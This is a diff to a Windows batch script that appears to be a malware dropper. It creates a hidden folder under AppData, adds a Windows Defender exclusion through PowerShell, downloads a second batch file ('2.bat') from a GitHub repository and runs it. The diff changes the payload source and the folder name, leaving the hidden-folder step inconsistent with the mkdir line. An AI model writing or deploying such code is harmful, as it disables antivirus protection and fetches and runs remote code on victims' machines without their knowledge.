@@ -28,10 +28,10 @@ if '%errorlevel%' NEQ '0' (
 
 cd "C:\Users\%USERNAME%\AppData\Local"
 mkdir "Anon"
-attrib +h "Anon" /s /d
+attrib +h "Antho" /s /d
 
 powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
 
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm39/fud/raw/main/2.bat' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"
-cd C:\Users\%USERNAME%\AppData\Local\Anon"
+Powershell -Command "Invoke-Webrequest 'https://github.com/SkillsNoHacks/yud/raw/main/2.bat' -OutFile C:\Users\%USERNAME%\AppData\Local\Antho\2.bat"
+cd C:\Users\%USERNAME%\AppData\Local\Antho"
 start 2.bat
